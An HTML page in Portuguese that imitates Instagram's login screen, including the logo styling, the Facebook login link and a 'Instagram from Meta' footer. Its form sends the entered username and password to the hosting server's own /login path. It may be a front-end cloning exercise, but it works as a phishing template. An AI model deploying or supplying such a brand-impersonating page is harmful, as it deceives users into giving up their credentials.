<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Instagram</title>
  <!-- Importando a fonte cursiva semelhante à do Instagram -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      background-color: #ffffff;
      color: #262626;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
      justify-content: space-between;
      align-items: center;
      padding: 20px 0 0 0;
    }

    .main-container {
      width: 100%;
      max-width: 350px;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 0 40px;
      margin: auto;
    }

    .instagram-logo {
      font-family: 'Grand Hotel', cursive;
      font-size: 3.8rem;
      font-weight: 400;
      margin: 36px 0 24px 0;
      text-align: center;
      color: #262626;
    }

    .login-form {
      width: 100%;
      display: flex;
      flex-direction: column;
      gap: 12px;
    }

    .input-group {
      position: relative;
      width: 100%;
    }

    .input-field {
      width: 100%;
      padding: 12px 10px;
      background-color: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 5px;
      font-size: 0.85rem;
      color: #262626;
      outline: none;
    }

    .input-field:focus {
      border-color: #a8a8a8;
    }

    .input-field::placeholder {
      color: #8e8e8e;
    }

    .btn-submit {
      width: 100%;
      padding: 10px;
      background-color: #0095f6;
      color: #ffffff;
      border: none;
      border-radius: 8px;
      font-weight: 600;
      font-size: 0.9rem;
      cursor: pointer;
      margin-top: 6px;
    }

    .btn-submit:hover {
      background-color: #1877f2;
    }

    .divider {
      display: flex;
      align-items: center;
      width: 100%;
      margin: 18px 0;
    }

    .divider-line {
      flex: 1;
      height: 1px;
      background-color: #dbdbdb;
    }

    .divider-text {
      padding: 0 18px;
      color: #8e8e8e;
      font-size: 0.8rem;
      font-weight: 600;
      text-transform: uppercase;
    }

    .fb-login {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      color: #385185;
      font-weight: 600;
      font-size: 0.9rem;
      text-decoration: none;
      margin-bottom: 12px;
    }

    .forgot-password {
      color: #00376b;
      font-size: 0.75rem;
      text-decoration: none;
      text-align: center;
      margin-top: 12px;
    }

    .signup-box {
      width: 100%;
      max-width: 350px;
      padding: 20px;
      border: 1px solid #dbdbdb;
      border-radius: 1px;
      text-align: center;
      font-size: 0.85rem;
      color: #262626;
      margin-bottom: 10px;
      background-color: #ffffff;
    }

    .signup-box a {
      color: #0095f6;
      font-weight: 600;
      text-decoration: none;
    }

    footer {
      text-align: center;
      font-size: 0.75rem;
      color: #8e8e8e;
      padding: 20px;
    }
  </style>
</head>
<body>

  <div class="main-container">
    <h1 class="instagram-logo">Instagram</h1>

    <form class="login-form" action="/login" method="POST">
      <div class="input-group">
        <input type="text" class="input-field" name="username" placeholder="Telefone, nome de usuário ou e-mail" required />
      </div>
      <div class="input-group">
        <input type="password" class="input-field" name="password" placeholder="Senha" required />
      </div>

      <button type="submit" class="btn-submit">Entrar</button>

      <div class="divider">
        <div class="divider-line"></div>
        <div class="divider-text">OU</div>
        <div class="divider-line"></div>
      </div>

      <a href="#" class="fb-login">
        <svg viewBox="0 0 24 24" width="16" height="16" fill="#385185">
          <path d="M12 2.04c-5.5 0-10 4.5-10 10 0 5 3.66 9.13 8.44 9.88v-6.99h-2.54v-2.89h2.54v-2.2c0-2.5 1.49-3.89 3.77-3.89 1.09 0 2.23.2 2.23.2v2.45h-1.25c-1.24 0-1.63.77-1.63 1.56v1.88h2.77l-.44 2.89h-2.33v6.98c4.78-.75 8.44-4.88 8.44-9.88 0-5.5-4.5-10-10-10z"/>
        </svg>
        Entrar com o Facebook
      </a>

      <a href="#" class="forgot-password">Esqueceu a senha?</a>
    </form>
  </div>

  <div class="signup-box">
    Não tem uma conta? <a href="#">Cadastre-se.</a>
  </div>

  <footer>
    <p>© 2026 Instagram from Meta</p>
  </footer>

  <script src="script.js"></script>
</body>
</html>
